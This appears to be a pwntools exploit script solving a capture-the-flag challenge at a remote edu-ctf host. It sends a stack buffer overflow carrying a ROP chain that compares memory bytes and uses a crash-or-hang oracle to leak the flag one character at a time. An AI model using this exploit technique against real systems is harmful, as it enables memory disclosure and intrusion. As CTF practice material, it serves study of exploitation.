#!/usr/bin/python3

from pwn import *
import string
import time

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

wordlist = string.printable.encode()

flag_addr = 0x4de2e0

rop_pop_rdx_ret = 0x40171f
rop_pop_rdi_ret = 0x401812
rop_pop_rax_ret = 0x458237
rop_cmp = 0x43a02d # cmp byte ptr [rdi], dl ; ret
rop_check = 0x401012 # je 0x401016 ; call rax
# 0x404016 = add rsp, 8 ; ret
rop_jmp_rax = 0x401b58

flag = b''
for idx in range(0x20):
    for w in wordlist:
        #r = process("./chal")
        r = remote('edu-ctf.zoolab.org', 10012)
        payload = flat(
            rop_pop_rax_ret, rop_jmp_rax,
            rop_pop_rdi_ret, flag_addr + idx,
            rop_pop_rdx_ret, w,

            rop_cmp,
            rop_check, 0, 0xdeadbeef
        )
        r.sendafter('rop\n', b'A'*0x28 + payload)

        try:
            r.recv(1, timeout=0.1)
            r.close()
        except EOFError:
            flag += bytes([w])
            del r
            break

    print(f"current flag: {flag.decode()}")

r.interactive()
